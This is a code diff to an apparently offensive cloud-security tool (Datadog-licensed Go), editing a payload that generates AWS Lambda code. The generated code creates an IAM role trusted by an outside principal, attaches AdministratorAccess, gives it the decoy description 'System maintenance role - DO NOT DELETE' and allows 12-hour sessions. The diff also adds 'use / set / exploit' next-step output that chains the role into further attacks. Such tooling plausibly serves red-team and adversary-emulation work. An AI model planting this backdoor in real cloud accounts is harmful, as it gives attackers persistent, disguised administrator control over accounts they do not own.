@@ -1,3 +1,7 @@
+// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
+// This product includes software developed at Datadog (https://www.datadoghq.com/)
+// Copyright 2026 Datadog, Inc.
+
 package lambda
 
 import (
@@ -112,8 +116,6 @@ func (p *BackdoorCreateRolePayload) GenerateCode(options map[string]string) (str
 	code := `import json
 import boto3
 import time
-import random
-import string
 import os
 
 def lambda_handler(event, context):
@@ -128,38 +130,27 @@ def lambda_handler(event, context):
     try:
         iam_client = boto3.client('iam')
 
-        # Generate role name if not specified
         role_name = ` + roleNameCode + `
 
-        # Trust policy allowing the specified principal to assume the role
         trust_policy = '''` + trustPolicyCode + `'''
 
-        # Administrator access policy
         admin_policy_arn = 'arn:aws:iam::aws:policy/AdministratorAccess'
 
-        # Create the backdoor role
         role_response = iam_client.create_role(
             RoleName=role_name,
             AssumeRolePolicyDocument=trust_policy,
             Path='` + rolePath + `',
             Description='System maintenance role - DO NOT DELETE',
-            MaxSessionDuration=43200  # 12 hours
+            MaxSessionDuration=43200
         )
 
         result['role_arn'] = role_response['Role']['Arn']
         result['role_name'] = role_name
 
-        # Attach administrator policy
         iam_client.attach_role_policy(
             RoleName=role_name,
             PolicyArn=admin_policy_arn
         )
-
-        # Wait a moment for the role to be available
-        time.sleep(2)
-
-        # Test that the role was created successfully
-        get_role_response = iam_client.get_role(RoleName=role_name)
 
         result['trusted_principal'] = trusted_principal`
 
@@ -234,13 +225,12 @@ func (p *BackdoorCreateRolePayload) ProcessResult(result string) (string, error)
 				output.WriteString("External ID: " + externalID + "\n")
 			}
 
-			output.WriteString("\nTo assume this role:\n")
-			if assumeCmd, ok := parsedBody["assume_role_command"].(string); ok {
-				output.WriteString("$ " + assumeCmd + "\n")
+			if roleArn, ok := parsedBody["role_arn"].(string); ok {
+				output.WriteString("\nNext steps:\n")
+				output.WriteString("  use sts-001\n")
+				output.WriteString("  set ROLE_ARN " + roleArn + "\n")
+				output.WriteString("  exploit\n")
 			}
-
-			output.WriteString("\nThe role has AdministratorAccess policy attached.\n")
-			output.WriteString("Session duration: 12 hours maximum\n")
 
 		} else {
 			output.WriteString("✗ Failed to create backdoor role\n")
